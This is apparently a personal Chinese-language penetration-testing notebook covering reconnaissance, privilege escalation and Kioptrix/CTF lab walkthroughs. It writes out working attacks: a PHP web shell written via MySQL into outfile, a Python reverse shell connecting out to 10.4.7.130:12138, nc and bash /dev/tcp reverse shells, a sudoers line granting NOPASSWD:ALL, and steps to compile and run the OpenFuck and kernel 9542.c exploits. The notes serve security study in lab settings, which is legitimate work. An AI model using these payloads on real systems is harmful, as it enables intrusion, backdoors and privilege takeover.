渗透看这里。

[TOC]

# **一、信息收集**

## ——端口扫描与分析

查看二级域名的工具：在信息收集那个文件里。

layer爆破子域名

arp-scan -l 扫描局域网主机

Nmap可以查看哪些端口开放，用的什么系统

nmap -Pn -open -A -n -v -iL filename
-Pn：跳过主机发现，直接进行下面的操作
-n:不做DNS解析
-open：只显示开启的端口
-A：扫描过程中，输入回车，可以查看扫描进度
-v：显示详细信息
-F：快速扫描100个常见端口
-p:选择要扫描的端口  例：-p1-65535 （全端口扫描，中间没有空格）
-iL：为程序指定一个要扫描的IP列表
-sV：探测开放端口的服务和版本信息
-T可以选择扫描等级，默认T3，但想快点话，可以输入  -T4

nmap -A -p- -v 192.168.233.180 探活端口

masscan --rate=10000 --ports 0-65535 192.168.10.157 探火端口

nmap -sV -T4 -O -p 80,111,22 192.168.10.157 查看端口服务。

nmap -A -p- T4 xx.xx.xx.xx

whatweb http://192.168.10.157 扫描网站指纹信息

7KB在ctf_tools,查看有无敏感文件泄露。





常用的几种端口：

21：FTP远程文件传输端口

22：SSH，远程连接端口

3389端口：远程桌面连接

在发现这些端口只会我们可以尝试弱口令的爆破

这里推荐（hydra弱口令爆破工具）下载地址：`https://github.com/vanhauser-thc/thc-hydra`

6379端口：redis未授权访问GetShell

（http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/）

该链接就是关于6379未授权访问的介绍

https://blog.csdn.net/sdb5858874/article/details/80484010



## **中间件，脚本语言，数据库的识别**

  常见的服务器搭配

> linux + apache +php +mysql
>
> linux +nginx +php +mysql
>
> linux + tomcat +jsp + mysql/oracle
>
> windows + iis + asp(x) +mysql
>
> windows +iis  + php +mysql
>
> windows +apache  +php +mysql

指纹搜索识别

http://www.yunsee.cn/

**如果该版本的CMS不存在漏洞，我们就对它进行敏感目录扫描，使用工具: 御剑(御剑下载及使用)、weakfilescan、DirBuster等**

msfconsole

字典 cewl

cewl工具爬取目标网站信息，生成相对应的字典

https://www.codercto.com/a/44828.html





提权

[TOC]

先贴道题：[[HZNUCTF 2023 final\]ezgo | NSSCTF](https://www.nssctf.cn/problem/3605)

find提权：

[find基础命令与提权教程_find提权-CSDN博客](https://blog.csdn.net/weixin_44912169/article/details/105845909)

[find 命令提权 - 内向是一种性格 - 博客园 (cnblogs.com)](https://www.cnblogs.com/aaak/p/15718561.html)

[su、sudo、sudo su、sudo -i sudo -l的用法和区别-CSDN博客](https://blog.csdn.net/mutou990/article/details/107724302)

```
/bin 存放所有用户皆可用的系统程序，系统启动或者系统修复时可用（在没有挂载 /usr 目录时就可以使用）
/sbin 存放超级用户才能使用的系统程序
/usr/bin 存放所有用户都可用的应用程序
/usr/sbin 存放超级用户才能使用的应用程序
/usr/local/bin 存放所有用户都可用的与本地机器无关的程序
/usr/local/sbin 存放超级用户才能使用的与本地机器无关的程序

```

```
shit=/usr/bin/sudo find /flag -exec cat /flag \;
shit=/usr/bin/sudo find /usr/bin/sudo -exec cat /flag \;
shit=/usr/bin/sudo find /usr/bin/find -exec cat /flag \;

# find  (一个路径或文件，必须存在)  -exec  执行命令 \;（\; 是-exec 参数的结尾标志）

```

# 提权

1，低权限可以修改可执行文件和脚本，能以高权限身份运行。

2，用低权限用户的运维人员也需要记忆输入备份凭据，以备使用高权限用户时完成操作。

3，超越权限体系，在其上层（如内存）修改/捕获凭据等信息。

## Linux

#### rbash逃逸

https://blog.csdn.net/qq_43168364/article/details/111830233

#### git提权

https://www.freebuf.com/articles/web/272617.html

tee提权

```
echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers
这句话的意思是将charles用户赋予执行sudo的权限添加到/etc/sudoers里。
| 是管道符 将前面的输出添加到后面
sudo teehee -a 是用管理员权限使用teehee -a命令
teehee -a 是添加一条语句到 /etc/sudoers里
/etc/sudoers 里存着的用户都有执行sudo的权限。

```

#### mysql提权

```
MySQL [(none)]> select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell1.php";
其实可以直接写提权语句。
即
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.7.130",12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
把这段话执行。

<?php echo shell_exec(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.7.130",12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);');?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell1.php";
```



## Windows

# 目录扫描

dirsearch -u 192.168.120.132 -e * -i 200

只显示状态码是200的

# 交互式shell

python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo

export TERM=xterm-color

rlwrap nc -lvnp 443

# 手工枚举

whoami   /   id   /   who   /   w   /   last

uname -a(内存内核)   /   lsb_release -a   /   cat /proc/version   /   cat  /etc/issue   /   hostnamectl   /   ip addr   /   ip route   /   arp -a

sudo -l 看哪些是以root身份执行的

getcap -r / 2>/dev/null

cat /etc/passwd 看用户

cat /etc/crontab自动任务

ps -ef

ps -axjf

ps -aux

find / -perm -u=s -type f 2>dev/null

# 反弹shell脚本

"D:\信息安全\文件上传\fantan_shell.txt"

反弹shell语句：

```
1：
nc -nv 192.168.141.134 4444 -e /bin/bash
2：
bash -i >& /dev/tcp/192.168.141.134/4444 0>&1
```

# 提权案例展示：

#### kioptrix1

```
kioptrix1
切入点：mod_ssl
查找mod_ssl相关漏洞，进行编译，即可提权成功
kali:searchsploit mod_ssl

cd Openluck
gcc -o OpenFuck OpenFuck.c -lcrypto
./OpenFuck
./OpenFuck 0x6b 192.168.1.102 443 -c 50
```

![1710313346220](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710313346220.png)

查找对应版本。

./OpenFuck 0x6b 192.168.1.102 443 -c 50

在0x6b位置处填写。

#### kioptrix2

反弹shell内核提权

```
使用反弹shell语句获取shell.
使用内核提权。

查看内核版本
uname -a

新开命令窗口进行搜索（kernel：核心）
searchsploit linux kernel 2.6 centos

将9542.c复制
searchsploit -m 9542.c

在当前目录下打开http服务
python3 -m http.server 8080

回到刚才的shell窗口
输入
wget http://（kali的ip):8080/9542.c

如果发现提示权限不足
那么我们就返回到根目录
cd /
去查看那个文件夹具有写入权限
ls -l

发现/tmp有
```

![1710314242982](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710314242982.png)

所以我们发现  tmp  文件夹具有写入权限

所以我们切换到tmp文件夹再试一次

```bash
cd tmp
wget http://192.168.1.6:8080/9542.c

会发现我们下载成功
编译运行
gcc 9542.c
./a.out
```

![1710314318381](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710314318381.png)

#### kioptrix3vm

```
ssh登录进去，然后就提权

sudo -l


```

![1710330987882](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710330987882.png)

```
sudo /usr/local/bin/ht
```

![1710331055114](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710331055114.png)

![1710331075767](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710331075767.png)

![1710331353951](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710331353951.png)

看见3个ALL，执行命令 sudo su - root

DRAGON ball

```
find / -perm -4000 -type f 2>/dev/null
通过上述命令，攻击者可以枚举出目标系统上所有的可执行文件，这里可以看到/home/raj/script/shell具有SUID权限。

SUID权限是Linux系统中的一种特殊权限，具体表现为文件拥有者的执行权限“x”被替换为“s”。这种权限允许用户在执行文件时临时获得文件拥有者的身份和权限。只有二进制程序文件才可以设定SUID权限，其他类型的文件设置此权限没有意义。
```

这篇文章讲的很清楚。

[内网提权：suid+劫持环境变量提权_linux环境变量劫持提权-CSDN博客](https://blog.csdn.net/ON_Zero/article/details/130544124?ops_request_misc=%7B%22request%5Fid%22%3A%22171091832316800185871083%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=171091832316800185871083&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-130544124-null-null.142^v99^pc_search_result_base1&utm_term=内网提权 路径劫持&spm=1018.2226.3001.4187)